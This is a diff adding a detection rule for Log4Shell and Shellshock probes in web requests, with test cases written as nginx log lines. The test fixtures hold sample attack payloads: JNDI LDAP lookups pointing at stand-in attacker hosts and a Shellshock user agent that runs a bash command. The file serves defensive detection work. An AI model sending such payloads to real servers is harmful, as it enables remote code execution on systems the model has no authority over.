@@ -1,0 +1,36 @@
+id: web-rce-probe
+title: Remote code execution probe (Log4Shell, Shellshock)
+description: The request carries a JNDI lookup or a Shellshock function definition.
+severity: critical
+tags: [attack.initial_access, attack.t1190]
+detection:
+  selection_ua:
+    user_agent|contains: ['${jndi:', '() {']
+  selection_path:
+    http_path|contains: ['${jndi:', '() {']
+  condition: 1 of selection_*
+  threshold:
+    group_by: src_ip
+    count: 1
+    window: 1h
+tests:
+  - name: jndi in user agent fires
+    source: nginx
+    alerts: 1
+    lines:
+      - '198.51.100.200 - - [18/Oct/2026:14:00:00 +0000] "GET / HTTP/1.1" 200 512 "-" "${jndi:ldap://198.51.100.200:1389/a}"'
+  - name: shellshock in user agent fires
+    source: nginx
+    alerts: 1
+    lines:
+      - '198.51.100.201 - - [18/Oct/2026:14:05:00 +0000] "GET /cgi-bin/status HTTP/1.1" 500 512 "-" "() { :;}; /bin/bash -c ''id''"'
+  - name: jndi in query fires
+    source: nginx
+    alerts: 1
+    lines:
+      - '198.51.100.202 - - [18/Oct/2026:14:10:00 +0000] "GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64)"'
+  - name: ordinary request does not fire
+    source: nginx
+    alerts: 0
+    lines:
+      - '10.0.0.7 - - [18/Oct/2026:14:20:00 +0000] "GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64)"'
